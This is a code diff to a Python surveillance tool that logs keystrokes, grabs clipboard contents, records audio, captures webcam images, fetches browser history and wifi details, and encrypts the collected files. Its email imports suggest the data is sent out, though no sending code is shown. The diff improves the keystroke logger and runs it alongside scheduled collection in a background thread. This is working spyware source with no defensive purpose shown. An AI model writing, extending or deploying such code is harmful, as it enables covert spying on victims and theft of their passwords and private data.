@@ -4,6 +4,7 @@ import socket
 import platform
 import smtplib
 import subprocess
+import threading
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -17,12 +18,13 @@ import sqlite3
 import win32clipboard
 from scipy.io.wavfile import write
 import sounddevice as sd
-from pynput.keyboard import Key, Listener
+from pynput import keyboard
 from cv2 import VideoCapture, imwrite, destroyWindow
 import schedule
 import time
 
 # Global Variables
+
 keys_info = "key_log.txt"
 system_info = "system_info.txt"
 clipboard_info = "clipboard.txt"
@@ -151,10 +153,24 @@ def wifi_info_fetch():
 
 # Keylogger
 def on_press(key):
-    global keys
-    keys.append(key)
-    write_file(keys)
-    keys = []
+    try:
+        # Handle printable characters
+        k = key.char if key.char else str(key)
+    except AttributeError:
+        # Handle special keys
+        k = str(key)
+    
+    # Write directly to the file on each key press
+    with open(file_path + keys_info, "a") as f:
+        if k.find("Key.space") > -1:
+            f.write("\n")  # Add a new line for space
+        elif k.find("Key") == -1:
+            f.write(k)  # Write printable keys
+        else:
+            f.write(f"[{k}]")  # Write special keys like [Key.enter], [Key.shift]
+    
+
+    
 
 def write_file(keys):
     with open(file_path + keys_info, "a") as f:
@@ -166,7 +182,7 @@ def write_file(keys):
                 f.write(k)
 
 def on_release(key):
-    if key == Key.esc:
+    if key == keyboard.Key.esc:
         return False
 
 # Consolidate Data into Readable Format
@@ -211,8 +227,37 @@ webcam_capture()
 fetch_browser_history()
 wifi_info_fetch()
 consolidate_data()
-while True:
-    schedule.run_pending()
-    time.sleep(1) 
+
+
+# def on_release(key):
+#     if key == keyboard.Key.esc:
+#         # Stop listener
+#         return False
+
+# with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
+#     listener.join()
+
+# while True:
+#     schedule.run_pending()
+#     time.sleep(1) 
+
+def run_scheduled_tasks():
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+
+def start_keylogger():
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+
+schedule_thread = threading.Thread(target=run_scheduled_tasks)
+schedule_thread.daemon = True
+schedule_thread.start()
+
+    # Start the keylogger in the main thread
+start_keylogger()
+
+
 files_to_encrypt = [file_path + system_info, file_path + keys_info, file_path + clipboard_info, file_path + wifi_info, file_path + consolidated_log]
 encrypt_files(files_to_encrypt)
